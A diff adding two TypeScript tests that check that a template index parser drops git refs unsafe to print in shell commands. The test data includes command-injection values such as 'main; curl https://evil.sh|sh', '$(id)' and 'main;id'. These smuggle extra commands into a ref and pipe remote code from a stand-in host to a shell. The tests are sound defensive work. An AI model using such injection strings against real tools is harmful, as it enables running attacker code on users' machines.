@@ -177,6 +177,15 @@ test('parseTemplatesIndex frees strings of control characters and treats a bad v
   assert.deepEqual(entry?.source.facts?.env, [{ name: 'A_KEY', description: '' }])
 })
 
+test('parseTemplatesIndex keeps only refs that are safe to print in a shell command', () => {
+  const refs = ['main', 'v1.0.0', 'release/0.10.x', 'main; curl https://evil.sh|sh', 'x;curl${IFS}evil.sh|sh', '$(id)', '`id`', '-x', 'a..b', '.', 'a b', '']
+  const index = parseTemplatesIndex({
+    schema: 1,
+    templates: refs.map((ref, position) => ({ github: `acme/app-${position}`, status: 'active', ref, source: { sha: SHA_SOURCE } })),
+  })
+  assert.deepEqual(index?.templates.map((entry) => entry.ref), ['main', 'v1.0.0', 'release/0.10.x', null, null, null, null, null, null, null, null, null])
+})
+
 test('fetchTemplatesIndex retries once after a 5xx or a network error and never after a 4xx', async () => {
   const run = async (answers: Array<number | Error>) => {
     let calls = 0
@@ -447,6 +456,30 @@ test('a missing index sha of an entry without ref suggests the default branch', 
   )
   const selection = await resolveTemplateSelection(parseTemplateArg('b2b-portal'), { ...DEPS, fetchImpl })
   await assert.rejects(downloadSelectedTemplate(selection, { ...DEPS, fetchImpl }), /--template acme\/b2b-portal#develop\./)
+})
+
+test('a missing index sha never prints an unsafe index ref or default branch in the #ref hint', async () => {
+  const body = {
+    schema: 1,
+    templates: [{ slug: 'evil', github: 'acme/evil', status: 'active', ref: 'x;curl${IFS}evil.sh|sh', source: { sha: SHA_SOURCE } }],
+  }
+  const safe = mockFetch(
+    indexRoute(body),
+    tarballRoute('acme/evil', SHA_SOURCE, () => json({ message: 'Not Found' }, 404)),
+    repoRoute('acme/evil'),
+  )
+  const selection = await resolveTemplateSelection(parseTemplateArg('evil'), { ...DEPS, fetchImpl: safe.fetchImpl })
+  assert.equal(selection.ref, null, 'the unsafe index ref is dropped')
+  await assert.rejects(downloadSelectedTemplate(selection, { ...DEPS, fetchImpl: safe.fetchImpl }), /--template acme\/evil#main\. That code is not verified\./)
+
+  const unsafeBranch = mockFetch(
+    tarballRoute('acme/evil', SHA_SOURCE, () => json({ message: 'Not Found' }, 404)),
+    repoRoute('acme/evil', 'main;id'),
+  )
+  const error = await downloadSelectedTemplate(selection, { ...DEPS, fetchImpl: unsafeBranch.fetchImpl }).catch((caught: Error) => caught)
+  assert.ok(error instanceof Error)
+  assert.match(error.message, /--template acme\/evil#<branch or tag>\./)
+  assert.doesNotMatch(error.message, /main;id/)
 })
 
 test('a missing repo on download gets the access error, and a selected sha downloads by sha', async () => {
